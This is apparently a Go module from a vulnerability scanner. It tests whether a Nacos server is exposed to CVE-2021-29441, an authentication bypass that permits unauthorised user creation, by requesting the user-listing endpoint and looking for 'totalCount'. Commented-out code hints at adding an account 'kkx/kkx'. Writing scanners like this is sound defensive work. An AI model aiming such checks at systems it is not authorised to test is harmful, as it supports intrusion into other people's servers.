package nacos

import (
	"Qscan/http"
	"fmt"
	"strings"
)

func CVE_2021_29441(Url string) (bool, map[string]string) {
	info := map[string]string{
		"漏洞名称":  "Nacos未授权添加用户漏洞",
		"CVE编号": "CVE-2021-29441",
		"漏洞简介":  "nacos是中国阿里巴巴（Alibaba）的一个动态服务发现、配置和服务管理平台。该软件支持基于 DNS 和基于 RPC 的服务发现，可提供提供实时健康检查，阻止服务向不健康的主机或服务实例发送请求等功能。\nNacos 存在安全漏洞，该漏洞源于允许Nacos服务器绕过过滤器，从而跳过身份验证检查。这种机制依赖于用户代理HTTP头，因此很容易被欺骗。",
		"漏洞链接":  "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29441",
		"危害等级":  "高危",
	}
	header := make(map[string]string)
	//data := map[string]string{
	//	"user": "kkx",
	//	"pass": "kkx",
	//}
	resp, err := http.Get(Url+"nacos/v1/auth/users?pageNo=1&pageSize=10", header)
	if err != nil {
		return false, nil
	}

	if strings.Contains(resp.Body, "totalCount") && resp.StatusCode == 200 {
		fmt.Println("[+]存在Nacos未授权添加用户漏洞(CVE_2021_29441)")
		//fmt.Println("%s",red("成功添加用户[kkx/kkx]"))
		return true, info
	}
	return false, nil
}
